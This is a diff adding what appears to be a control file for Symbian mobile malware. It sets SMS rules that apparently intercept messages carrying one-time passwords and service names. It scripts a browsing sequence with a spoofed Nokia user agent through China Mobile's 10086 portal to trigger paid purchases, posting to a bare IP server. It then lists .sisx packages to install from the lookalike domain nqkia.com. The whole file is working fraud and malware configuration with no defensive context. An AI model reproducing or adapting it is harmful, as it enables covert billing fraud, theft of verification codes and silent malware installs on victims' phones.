@@ -1,0 +1,87 @@
+
+#m:11 ,2 ,13632830910 ,HDF818 , , ,0 , 
+#m:11 ,2 , ,how are you ,13632830910 ,hello ,0 , 
+#m:11 ,2 , , ,13632830910 ,将|联梦|电视智慧|本次密码  ,1 , 
+
+@@@@@@
+agent:NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+--------------Page1---------------
+u:http://a.10086.cn/pams2/m/s.do?c=148&j=l&bUrl=p%3D72&p=72
+v1:${href="^^">6300</a>}
+c:y
+m:1
+a:y
+--------------Page2---------------
+u:${v1}
+v1:${form action='^'}
+v2:mmsg=%E7%A6%8F%E5%88%B0%E8%BF%90%E6%B0%94%E5%A5%BD
+m:1
+c:y
+a:y
+--------------Page3---------------
+u:http://a.10086.cn:6060/pams2/s.do?c=211&j=l&mmsType=0&p=72
+p:${v2}
+m:2
+c:y
+a:y
+v1:${href="^"^s.do~300001355349}
+--------------Page4---------------
+u:${v1}
+m:1
+c:y
+a:y
+v1:${href="^"^s.do~gFeeType~300001355349}
+--------------Page5---------------
+u:${v1}
+m:1
+c:y
+a:y
+v1:${src="^"^validateProgramServlet}
+v2:${form action='^'}
+--------------Page6---------------
+u:${v1}
+m:1
+c:y
+a:y
+v1:${}
+--------------Page7---------------
+u:http://119.147.23.195:8080/mi/mmide
+m:2
+c:n
+p:${v1}
+a:y
+v1:${}
+--------------Page8---------------
+u:${v2}
+m:2
+p:${v1}
+c:y
+a:y
+v1:${href="^"^downloadAppForWeb}
+--------------Page9---------------
+u:${v1}
+m:1
+c:y
+a:y
+v1:${MIDlet-Jar-URL: ^0x0d}
+v2:${MIDlet-Install-Notify: ^0x0d}
+--------------Page10---------------
+u:${v1}
+m:1
+c:y
+a:y
+--------------Page11---------------
+u:${v2}
+m:3
+c:y
+a:y
+p:900 Success
+------
+
+
+@@@@@@
+
+#i,0x2003D898,http://nqkia.com/PACKAGE/c/TongJiJingLing_1001001.sisx,1
+#i,0x2005B8C2,http://nqkia.com/PACKAGE/c/soni.sisx,2
+#i,0x2005BC85,http://nqkia.com/PACKAGE/c/NOKIA.sisx,3
+#i,0x2005BE3A,http://nqkia.com/PACKAGE/c/s60_3x_signed_appended.sisx,4
